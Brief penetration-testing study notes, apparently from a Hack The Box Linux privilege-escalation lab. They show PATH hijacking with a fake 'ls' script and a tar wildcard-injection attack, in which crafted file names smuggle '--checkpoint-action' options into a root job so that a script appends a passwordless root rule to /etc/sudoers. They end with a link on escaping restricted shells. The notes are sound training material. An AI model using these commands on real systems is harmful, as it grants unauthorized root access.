
```sh
PATH =.:${PATH}
export PATH
echo $PATH
#then 
touch ls
echo 'echo "PATH ABUSE!!"' > ls
chmod +x ls
```

Example of wildcard abuse : 
```sh
echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh

echo "" > "--checkpoint-action=exec=sh root.sh"

echo "" > --checkpoint=1
```
Output: 
```sh
htb-student@NIX02:~$ ls -la

total 56
drwxrwxrwt 10 root        root        4096 Aug 31 23:12 .
drwxr-xr-x 24 root        root        4096 Aug 31 02:24 ..
-rw-r--r--  1 root        root         378 Aug 31 23:12 backup.tar.gz
-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint=1
-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint-action=exec=sh root.sh
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .font-unix
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .ICE-unix
-rw-rw-r--  1 htb-student htb-student   60 Aug 31 23:11 root.sh
```

Restricted shell resource :
	https://0xffsec.com/handbook/shells/restricted-shells/